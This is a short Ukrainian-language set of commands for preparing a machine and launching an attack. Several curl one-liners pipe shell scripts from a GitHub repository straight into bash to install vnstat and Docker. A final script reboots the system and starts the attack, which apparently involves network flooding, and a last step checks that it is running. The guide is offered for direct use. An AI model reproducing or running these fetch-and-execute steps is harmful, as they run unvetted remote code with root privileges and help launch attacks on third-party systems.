#                         Команди для підготовки машини та запуску атаки

curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/vnstat_install.sh | bash - встановлюєм программу vnstat
vnstat - якщо бажання перевірити чи усе встановилося 

curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/docker_install.sh | bash - встановлюєм программу docker
sudo docker run hello-world - перевіряємо чи встановився docker


curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/system_prepare.sh | bash - підготування системи \ перезагрузка - та запуск атаки

sudo screen -r - перевірити чи атаке йдє
